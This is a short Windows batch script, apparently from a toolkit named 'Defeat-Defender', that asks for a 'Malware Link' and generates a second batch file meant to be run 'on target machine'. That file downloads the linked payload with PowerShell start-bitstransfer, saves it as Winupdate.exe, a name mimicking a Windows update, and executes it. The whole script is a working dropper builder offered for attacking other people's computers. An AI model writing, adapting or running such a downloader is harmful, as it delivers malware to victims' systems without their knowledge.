@echo off
type batch.txt
color 0a
echo.
echo.
set /p a="Enter Malware Link: "
if [%a%]==[] (goto error ) else (goto main)
:main
echo  Your  Url is :  %a% 
echo. >>defeat.bat
echo powershell -command "start-bitstransfer %a%   .\Winupdate.exe" >>Defeat-Defender.bat
echo. >>defeat.bat
echo start  Winupdate.exe >>Defeat-Defender.bat
echo. >>Defeat-Defender.bat
echo. >>Defeat-Defender.bat
echo.
echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
pause
exit /B 
:error
echo Please Enter Link And Try Again!!!
pause
